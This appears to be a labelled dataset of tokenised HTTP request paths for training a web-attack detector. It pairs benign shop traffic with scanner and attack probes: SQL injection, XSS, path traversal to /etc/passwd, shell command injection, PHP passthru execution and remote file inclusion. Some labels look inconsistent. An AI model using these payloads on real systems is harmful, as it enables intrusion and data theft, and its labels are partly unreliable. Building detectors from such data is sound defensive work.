request	label
"/ a0imiuf1 . mscgi ?  < meta http-equiv = set-cookie content =  "" testxqrn = 4654 ""  > "	1
/ string / modo = registro & login = owens & passworda = en68jec63i0nto & nombre = deidamia & apellidos = vias + batle & email = vendeuil @ soycatalan . zw & dni = 69051312e & direccion = ramon + cabanillas + s / n +  & ciudad = alcdia ,  + l '  & cp = 35283 & provincia = badajoz & ntc = 1272142225716686 & b1 = registrar 	1
/ alltitles / 	0
/ string / strings / parameters = zabalza 	0
/ 131483 / 	0
/ recordings / install . php ? newlang =  .  .  /  .  .  / cpg_error . log \ x00 	1
/ javascript / css . csproj 	0
/ dl5834 / 	0
/ bzuf9ozq . idc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ main . php ? stuff =  '  & sleep \ x099 \ x09 # 	1
/ fun-morph / 	0
/ string / strings / parameters = 0u5o 	0
/ string / strings / parameters = mcavoy-zabczynski @ discotecateatre . gt 	0
/ somian / 	0
/ string / modo = registro & login = arbuckle & password = c594h6e5 & nombre = isolina & apellidos = arqu + rocas & email = pardos @ barcafedaniss . co & dni = 89611985y & direccion = major + del + raval ,  + 14 + 6 ? c & ciudad = valdeolivas & cp = 18001 & provincia = cceres & ntc = 2966176869826154 & b1 = registrar 	0
/ string / strings / parameters = zo 	0
/ internet killed the video star / 	0
"/ string / strings / parameters = & lt ; style type =  \  "" text / javascript \  ""  & gt ; alert (  ' xss '  )  ;  & lt ;  / style & gt ; "	1
"/ azcrfs8d . mscgi ?  < meta http-equiv = set-cookie content =  "" testjpdr = 9205 ""  > "	1
/ examples / jsp / sessions / zpanel . php ? page =  / etc / passwd \ x00 	1
/ string / strings / parameters = 33529 	0
/ sensation 2002 black edition cd2 / 	0
/ string / strings / parameters = jaran6ro 	0
/ include / cls_headline_prod . php ? include_path = xxpathxx 	1
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testvqcy = 252 ""  > "	1
"/ vwmg565s . htm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ h5i6crm3 . fts ?  < script > document . cookie =  "" testlihk = 7070 ;  ""  <  / script > "	1
"/ i7prbs22 . html ?  < meta http-equiv = set-cookie content =  "" testjnre = 7328 ""  > "	1
"/ b4vng02k . html ?  < script > document . cookie =  "" testtrlh = 3672 ;  ""  <  / script > "	1
/ javascript / 4 . part 	0
/ psximgts / 	0
/ main . php ? g2_itemid =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / license \ x00 	1
/ scripts / cal_cat . php ? op = cats & year = 2008 & catview = 1 + union + select + 1 , 1332009306 	1
"/ string / strings / parameters = -2726 ""  ""  )  )  or elt ( 1032 = 1032 , 3623 )  and  (  (  ""  "" ococ ""  ""  =  ""  "" ococ "	1
/ 121917 / 	0
/ javascript / cgi-home 	0
/ string / strings / parameters = sierra de la estrella ,  8 	0
/ hdtv003 / 	0
/ string / strings / parameters = virhuez prats 	0
/ 01eb024 / 	0
/ main . php ? logout =  ; uname  > q17429254  # 	1
/ string / strings / parameters = -5580 or 4829 = 1968 	1
/ script_path / config . inc . php ? _path = http :  /  / 192 . 168 . 202 . 118 : 8080 / iroy1gvqrrqu ?  ? 	1
/ string / modo = insertar & precio = 7159 & b1 = pasar + por + caja 	0
/ string / strings / parameters = or 1 = 1  -- 	1
/ string / strings / parameters = 1 '  and 8312 = dbms_pipe . receive_message ( chr ( 69 )  |  | chr ( 79 )  |  | chr ( 101 )  |  | chr ( 68 )  , 5 )  -- 	1
/ image1off / 	0
/ string / strings / parameters = nahmias 	0
/ javascript / postgres . exe 	1
/ javascript / evt . ini 	0
/ plugins / spamx / editip . admin . class . php ? _conf [ path ]  = xxpathxx 	1
/ string / strings / parameters = |  | echo $ ifsewiiaa $  (  ( 5 + 86 )  )  $  ( echo $ ifsewiiaa ) ewiiaa \  \ 	1
"/ string / strings / parameters = -2414 %  ""  ""  )  or elt ( 1032 = 1032 , 3623 )  and  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ footband / 	0
/ viewer $ 674 / 	0
/ string / modo = entrar & login = willa & pwd = 10g2st19 & remember = on & b1 = entrar 	0
/ string / strings / parameters = gorfine 	0
"/ string / strings / parameters = 1 ""  ""  )  )  as sdlv where 5922 = 5922 and 2006 = 2006 "	1
/ javascript / print . rss 	0
/ examples / jsp / colors / print . php ? what = article & id =  ' 	1
/ javascript / gz . svn-base 	0
"/ string / strings / parameters = -1 < base href =  ""  "" javascript : document . cookie = true ;  /  /  ""  ""  > "	1
"/ ht8pn8uq . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ string / strings / parameters = ""  ;  str =  $  ( echo usunjp )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | "	1
/ reqfrm / 	0
/ string / strings / parameters = potentado 	0
/ mystique / 	0
"/ main . php ? stuff =  ""  ; uname  > q85142671  # "	1
/ string / strings / parameters = .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows \ win . ini 	1
/ string / strings / parameters = 1 '  )  )  ; select  *  from generate_series ( 4975 , 4975 , case when  ( 4975 = 9615 )  then 1 else 0 end )  limit 1 -- 	1
"/ fc9t54l7 . idc ?  < meta http-equiv = set-cookie content =  "" testggad = 2000 ""  > "	1
/ adres strony / 	0
/ 141724 / 	0
/ etales / 	0
/ string / strings / parameters = todito 	0
/ templates / barrel / template . tpl . php ? renderer = xxpathxx ? 	1
/ matt hayes fishing / 	0
"/ nyvbv05h . cgi ?  < meta http-equiv = set-cookie content =  "" testftxz = 5980 ""  > "	1
"/ string / strings / parameters = ""   str =  $  ( echo vycnrp )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "" "	1
/ string / str =  $  ( echo bthzml )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ sthurston / 	0
/ 150683 / 	0
/ 11613796 / 	0
/ string / strings / parameters = 05593 	0
/ string / strings / parameters = cortadellas @ ppmanzanares . cx 	0
/ propagandhi / 	0
/ string / strings / parameters = 1 '  )  )  as yqcl where 5026 = 5026 rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  -- 	1
/ compact-off / 	0
/ string / modo = insertar & precio = 2545 & b1 = confirmar 	0
/ cgi-bin / lib / owl_api . php ? xrms_file_root =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ string / strings / parameters = ""  | echo $ ifsneanfv $  (  ( 47 + 58 )  )  $  ( echo $ ifsneanfv ) neanfv /  / "	1
/ level505 / 	0
/ lesson22 / 	0
/ javascript / utility . meta 	0
/ bin / gw5 / gwweb . exe ? htmlver = aaa & get-context 	1
"/ managersearch-results . dot ? search_query = nessus ""  >  < script > alert (  ' dotcms_search_query_xss . nasl '  )  <  / script >  / "	1
/ view_135 / 	0
/ cddvdduplicators / 	0
/ j_woodruff10104 / 	0
/ string / strings / parameters = baumgarten bagudanc 	0
/ string / strings / parameters = 17240 	0
/ colour of the truth / 	0
/ www / delivery / ac . php ? bannerid = -1332008596 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_pqgrdtsr ]  )  )  ; die ;  /  * 	1
/ ns9169740340 / 	0
/ javascript / contest . exe 	1
/ string / strings / parameters = diafragmar 	0
/ ibm-785 / 	0
/  .  .  % u00255c .  .  % u00255c / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og 	1
/ string / strings / parameters = < x  <  / onxxx = 1 	1
/ string / strings / parameters = gianna 	0
/ string / strings / parameters = erwin 	0
/ ottomatic / 	0
/ string / id = 2 & nombre = vino + rioja & precio = 85 & cantidad = 63 & b1 =  | 	1
/ tower_label / 	0
/ goldfilled-noodles / 	0
/ string / id = 3 & nombre = queso + manchego & precio = 39 & cantidad = 31 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = spruance @ maquillajeparalabios . ro 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo hbifjl )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  & 	1
/ examples / jsp / error / awstatstotals . php ? sort =  {  $  { passthru ( chr ( 105 )  . chr ( 100 )  )  }  }  {  $  { exit (  )  }  } 	0
/ string / strings / parameters = villares de yeltes 	0
/ string / strings / parameters = rougerie @ cincocolores . sd 	0
/ admin / components / com_fm / fm . install . php ? lm_absolute_path =  .  .  /  .  .  /  .  .  /  & install_dir = http :  /  / 192 . 168 . 202 . 118 : 8080 / iroy1gvqrrqu ?  ? 	1
/ string / modo = insertar & precio = 9289 & b1 = confirmar 	0
/ examples / jsp / jsp2 / jspx / inc / formmail . inc . php ? script_root =  .  .  / templates / mail . tpl . txt \ x00 	1
/ string / strings / parameters = 1 )  )  as bjxd where 4299 = 4299 ; select pg_sleep ( 5 )  -- 	1
/ string / strings / parameters = 1 %  '  )  )  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 and  (  (  '  %  '  =  ' 	1
/ string / strings / parameters = beique 	0
"/ manager / insertorder . cfm ? cfid = 1 & cftoken = 1 union select 1 , 2 , 3 , 4 , storename , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 , 14 , 15 from params "" having 1 = 1 "	1
/ string / strings / parameters = cardona 	0
/ string / strings / parameters = 8480127021010451 	0
/ techweb ' s rss feed / 	1
/ forums / browse . php ? fid = 3 & tid = 46 & go =  < script > javascript : alert (  ' vulnerable '  )  ;  <  / script > 	1
"/ string / strings / parameters = -6084 ""  ""  )  )  union all select 7354 , 7354 , 7354 , 7354 , 7354 , 7354 , 7354 , 7354 # "	1
/ 000048133 / 	0
/ center-bot / 	0
/ string / strings / parameters = 34259 	0
/ 102839 / 	0
/ javascript / cms . htm 	0
/ 44eecfc9a1281 / 	0
/ string / modo = entrar & login = alfi & pwd = g46r2ch4 & remember = on & b1 = entrar 	0
/ javascript / alpha . xsl 	0
/ _vti_bin /  .  .  \ xc0 \ xaf .  .  \ xc0 \ xaf .  .  \ xc0 \ xaf .  .  \ xc0 \ xaf .  .  \ xc0 \ xaf .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og 	1
/ string / modo = registro & login = cleve & password = glp3ica & nombre = ninfa & apellidos = perarnau + casas & email = as @  @  @ ter @ ropadegolf . qa & dni = 36470806m & direccion = plaa + dels + carros + 83 ,  +  & ciudad = darnius & cp = 31218 & provincia = navarra & ntc = 8300950645319009 & b1 = registrar 	1
/ string / modo = registro & login = cindra & password = di112i5a98n3e & nombre = halum & apellidos = rincn & email = gorecka-fosser @ peaf . sl & dni = 00984662d & direccion = calle + capita + farre ,  + 82 ,  + 8-d & ciudad = jalance & cp = 09228 & provincia = palencia & ntc = 9636562879352994 & b1 = registrar 	0
/ 181762 / 	0
/ string / strings / parameters = 3615 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo ghgvor )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  # 	1
/ string / strings / parameters = milka 	0
/ string / strings / parameters = 6619530004165015 	0
/ string / strings / parameters = ;  str =  $  ( echo sdkegm )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / 	1
/ pa_aceh / 	0
/ string / strings / parameters = valderredible 	0
/ string / strings / parameters = 1 %  '  )  or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  and  (  '  %  '  =  ' 	1
/ 158296 / 	0
/ string / strings / parameters = grecia 	0
/ msg21844 / 	0
/ string / strings / parameters = 50835477a 	0
/ string / strings / parameters = 1 '  )  where 3579 = 3579  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  -- 	1
/ recordings / setcookie . php ? u =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & plugin = pblang_mult_flaws . nasl 	1
/ string / strings / parameters = '  |  | echo $ ifsvgjppi $  (  ( 78 + 43 )  )  $  ( echo $ ifsvgjppi ) vgjppi & 	1
/  /  .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c / windows / win . ini 	1
/ javascript / stories . pl 	0
/ string / strings / parameters = kim 	0
/ string / strings / parameters = 8511359548446745 	0
/ 184150 / 	0
"/ m4kkjf8l . nsf ?  < script > document . cookie =  "" testyglc = 8988 ;  ""  <  / script > "	1
/ string / id = 3 & nombre = vino + rioja & precio = 39 & cantidad = 82 & b1 = any ?   set-cookie :  + tamper = 1041264011025374727 	1
/ string / strings / parameters = colrico 	0
/ partneroffer_bag / 	0
/ examples / jsp / num / js / scripts . php ? load =  / etc / passwd \ x00 	1
/ 289_pike / 	0
/ string / strings / parameters = 8382198475912470 	0
/ bigtitcams / 	0
/ string / strings / parameters = 1 )  where 5944 = 5944 and  ( 4446 = 8843 )  * 8843 -- 	1
/ string / strings / parameters = pelayo 	0
"/ 5qnlm5z2 . idc ?  < script > document . cookie =  "" testsixi = 8451 ;  ""  <  / script > "	1
/ string / strings / parameters = longo @ elbauldelosrefranes . web 	0
/ nfsen-hack / 	0
/ phpmyadmin / adodb-perf-module . inc . php ? last_module = zzz_adoconnection {  } system ( id )  ; class zzz_adoconnection {  }  /  / 	1
/ string / strings / parameters = thunder @ bodasconmusica . pm 	0
/ 83000776 / 	0
/ ylocallist-tm / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  as uxnc where 8041 = 8041 and 9198 = 9198 -- "	1
/ bungalowbrandshorts / 	0
/ scripts / index . php ? go = detail & id = -99999 /  *  *  / union /  *  *  / select /  *  *  / 0 , 1 , concat ( 1331919200 , 0x3a , 1131566153 )  , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 , 14 , 15 , 16 , 17 , 18 , 19 , 20 	1
/ javascript / forum . yml 	0
/ nikon-dx / 	0
/ top . php ? stuff = ver \ x0b > q96485831 & rem \ x0b 	1
/ dynamic / 	0
/ string / strings / parameters = willeke5 	0
/ icon_510004 / 	0
/ string / strings / parameters = dirosario @ errebebe . as 	0
/ examples / jsp / colors / index . php ? post =  .  .  / config / password 	1
/ string / strings / parameters = < svg / onload = alert ( 1 ) 	1
/ string / strings / parameters = extinti3o 	0
/ dsniff-1 / 	0
/ string / strings / parameters = 1 ; select  ( case when  ( 6276 = 6276 )  then 6276 else 6276 *  ( select 6276 from information_schema . character_sets )  end )  # 	1
/ 64bitpatching / 	0
/ javascript / weather . log 	0
/ decorative-wall / 	0
"/ string / strings / parameters = ""   str =  $  ( echo bhvrst )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' "	1
/ printpublishing / 	0
/ string / modo = entrar & login = transki & pwd = 4at4pln & remember = off & b1 = entrar 	0
/ javascript / error-log . as 	0
/ string / strings / parameters = zarrapastrosamente 	0
/ virtualplatforms / 	0
/ meeting02 / 	0
/ quagynka . cfc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ megaman music / 	0
/ h_middle / 	0
/ is_allofmp3com / 	0
/ string / strings / parameters = 18898337l 	0
/ cgi-bin / openview5 . exe ? target = main & action =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / winnt / win . ini 	1
/ string / strings / parameters = knio 	0
/ index-6 / 	0
/ string / strings / parameters = '  |   [  3 -ne  $  ( echo gqbapt  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ javascript / second . ini 	0
/ 050804-000100 / 	0
/ cgi-bin / cxvae_g3rjys . shtml 	0
"/ bl8sefdm . htm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = -5225 '  )  )  as zats where 5629 = 5629 union all select 5629 , 5629 , 5629 , 5629 , 5629 -- 	1
/ string / strings / parameters = 8e3i2ar 	0
/ string / strings / parameters = rodern 	0
/ article463 / 	0
"/ help . php ? q =  ""  & del \ xa0q49941678 & rem \ xa0 "	1
/ betablockmodules / recentpostmodule / recentpostmodule . php ? path_prefix =  @ rfiurl 	0
/ 20030925-8 / 	0
/ javascript / affiliate . pfx 	0
/ string / id = 3 & nombre = jamn + ibrico & precio = 39 & cantidad = 82 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = calle bernat de santa eugenia 90 	0
"/ top . php ? stuff =  "" del \ xa0q29642432 & rem \ xa0 "	1
/ 0222216 / 	0
/ subicon_balance / 	0
/ string / id = 1 & nombre = queso + manchego & precio = 85 & cantidad = 34 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = 1 )  or pg_sleep ( __time__ )  -- 	1
"/ 6qbynt4f . exe ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ come again / 	0
/ opus_dei / 	0
"/  ?  < meta http-equiv = set-cookie content =  "" testbgqj = 6434 ""  > "	1
/ string / strings / parameters = doriot 	0
/ string / strings / parameters = hi '  or 1 = 1  -- 	1
/ string / strings / parameters = 3375572623430817 	0
/ 175807 / 	0
/ string / modo = registro & login = arco & password = b74rera & nombre = agueda & apellidos = sauri + sanaspleda & email = gozzi @ encuentrodominios . at & dni = 57154114b & direccion = calle + medellin + 188 ,  + 3e & ciudad = h / erramlluri & cp = 26360 & provincia = cceres & ntc = 6165671894107883 & b1 = registrar 	1
/ string / strings / parameters = ingeniero pedro leon ,  160 ,  10-b 	0
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testsixi = 8451 ""  > "	1
"/ string / strings / parameters = ""   str =  $  ( echo zlowua )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | "	1
"/ string / strings / parameters = -9451 ""  ""  )  )  )  union all select 4211 , 4211 , 4211 , 4211 , 4211 , 4211 , 4211 -- "	1
/ 161824 / 	0
/ string / strings / parameters = tra5i0o0ed7a 	0
/ string / strings / parameters = |  | echo $ ifswoszub $  (  ( 94 + 79 )  )  $  ( echo $ ifswoszub ) woszub & 	1
/ moda-le_tatouage / 	0
/ string / strings / parameters = su0r6s09 	0
/ gnocky / 	0
/ string / strings / parameters = kaitlynn 	0
/ ljimages / 	0
"/ i2n4v4rl . htm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ amazon / info . php ? asin = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ? 	0
/ 047926 / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  (  (  ""  "" vjvz ""  ""  like  ""  "" vjvz "	1
"/ 0z575z74 . kspx ?  < meta http-equiv = set-cookie content =  "" testuhsv = 9753 ""  > "	1
/ string / strings / parameters = |  | echo $ ifsguunmq $  (  ( 78 + 22 )  )  $  ( echo $ ifsguunmq ) guunmq | 	1
/ string / strings / parameters = av .  don juan de borbon ,  s / n 	0
/ string / strings / parameters = -8625 or 3176 = 2519 #  fvgl 	1
